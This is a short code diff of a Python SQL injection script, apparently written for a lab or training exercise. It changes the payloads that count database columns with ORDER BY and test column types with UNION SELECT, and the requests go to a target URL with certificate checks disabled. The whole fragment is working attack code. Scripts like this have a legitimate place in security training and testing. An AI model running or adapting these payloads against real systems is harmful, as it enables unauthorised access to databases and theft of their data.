@@ -10,7 +10,7 @@ def sqli_count_columns(session, url):
         if col_count >= 50:
             print("[!] Error with script")
             return False
-        uri = url + "'+order+by+{}--".format(col_count + 1)
+        uri = url + "'+order+by+{}-- ".format(col_count + 1)
         res = session.get(uri, verify=False, proxies=proxies)
         print("[~] Status Code: " + str(res.status_code) + ". \n[~] URL: " + uri)
         if res.status_code in [500, 504]:
@@ -36,7 +36,7 @@ def get_column_types(session, url, column_count):
     col_types = []
     for i in range(0, column_count):
         tmp = ["NULL" if i != j else "'sqli'" for j in range(0, column_count)]
-        payload = "'+union+select+" + ",+".join(tmp) + "from dual --"
+        payload = "'+union+select+" + ",+".join(tmp) + "-- "
         print("[~] Testing Payload: " + payload)
 
         res = session.get(url + payload, verify=False, proxies=proxies)
